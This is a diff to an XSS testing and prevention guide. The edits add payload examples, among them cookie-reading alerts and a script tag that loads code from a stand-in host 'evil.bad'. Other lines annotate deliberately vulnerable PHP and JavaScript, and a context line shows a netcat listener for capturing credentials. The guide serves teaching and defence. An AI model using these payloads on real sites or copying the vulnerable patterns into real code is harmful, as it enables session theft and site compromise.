@@ -35,14 +35,18 @@ Top XSS prevention controls:
 Testing if webiste input boxes / search boxes are vulnerable to XSS
 
 ```
-Basic Payloads 
+Basic Payloads:
 
 <script>alert('XSS')</script>
+<body onload=alert(‘something’)>;
+<script>destroyWebsite();</script>
+<script>alert(document.cookie)</script>
+<b onmouseover=alert(‘XSS testing!‘)></b>
 <scr<script>ipt>alert('XSS')</scr<script>ipt>
 "><script>alert('XSS')</script>
 "><script>alert(String.fromCharCode(88,83,83))</script>
 
-SVG Payloads
+SVG Payloads:
 
 <svgonload=alert(1)>
 <svg/onload=alert('XSS')>
@@ -52,7 +56,7 @@ SVG Payloads
 "><svg/onload=alert(String.fromCharCode(88,83,83))>
 "><svg/onload=alert(/XSS/)
 
-IMG Payloads
+IMG Payloads:
 
 <img src=x onerror=alert('XSS');>
 <img src=x onerror=alert('XSS')//
@@ -62,7 +66,7 @@ IMG Payloads
 "><img src=x onerror=alert('XSS');>
 "><img src=x onerror=alert(String.fromCharCode(88,83,83));>
 
-HTML Payloads
+HTML Payloads:
 
 <body onload=alert(/XSS/.source)>
 <input autofocus onfocus=alert(1)>
@@ -76,6 +80,10 @@ HTML Payloads
 <audio src onloadstart=alert(1)>
 <marquee onstart=alert(1)>
 
+Remote Download Payloads:
+
+'"/><script src="https://evil.bad/xss.js"></script>
+
 Common abused tags for XSS
 
 <script>
@@ -88,10 +96,22 @@ Common abused tags for XSS
 <div>
 <object>
 <src>
+
+Dangerous HTML element attributes:
+
+These attributes will execute input as JavaScript by default , making it commonly abused in standard xss attacks
+
+- innerHTML
+- src
+- onLoad
+- onClick
 ```
 
 Unsecure PHP Vulnerable Code Example 1
 
+The below code is a simple text box that accepts user input and outputs it back to HTML so that the user can see the result
+
+The "text" parameter accepts user-supplied input and stores it in a variable called $text. The variable $text is not being sanitized before it is being passed to HTML as output   
 ```
 <center><h1><font color="red">PHP XSS Test</font></h1>
 <hr>
@@ -102,7 +122,7 @@ Unsecure PHP Vulnerable Code Example 1
 
 <?php
 if(isset($_POST["bouton"])){
-  $text = $_POST["text"];
+  $text = $_POST["text"];         //The "text" parameter is not being sanitized
   echo "<strong>Data:</strong>  ".$text;
 }
 
@@ -113,7 +133,7 @@ if(isset($_POST["bouton"])){
 ```
 Unsecure PHP XSS Code Example 2
 
-The below code snippet is vulnerable to XSS becuase the "name" paramater receives user-supplied input that is not being validated before it gets passed to HTML for output
+The below code snippet is vulnerable to XSS because the "name" parameter receives user-supplied input that is not being validated before it gets passed to HTML for output
 ```
 
 <?php
@@ -135,10 +155,9 @@ if (!isset($_GET['name']))
 
 ```
 
-
 Secure PHP XSS Code Example
 
-Below we added the htmlspecialchars() function infront of the "name" paramater to convert special characters such as <>'"& to HTML entities
+Below we added the htmlspecialchars() function infront of the "name" parameter to convert special characters such as <>'"& to HTML entities
 
 This allows HTML to output the user-supplied input as text instead of executing any script tags such as <script>--Malicious_String</script>
 
@@ -157,7 +176,7 @@ if (!isset($_GET['name']))  // Accept user input
 
 
 } else {
-  $name = htmlspecialchars($_GET['name']); // Function to sanatize HTML user input saved to the "name" paramater - Outputs user input as text
+  $name = htmlspecialchars($_GET['name']); // Function to sanatize HTML user input saved to the "name" parameter - Outputs user input as text
   echo "<h1>Hi $name!";
 }
 
@@ -179,6 +198,7 @@ Attacker: nc -lvnp 8080 // To capture credentials
 
 JavaScript Vulnerable Code Example 
 
+The below code is a example of vulnerable code in JS. The XSS are possible becuase the $user variable accepts user-supplied input and passes it as output in HTML without any form of validation
 ```
 const express = require('express')
 const app = express()
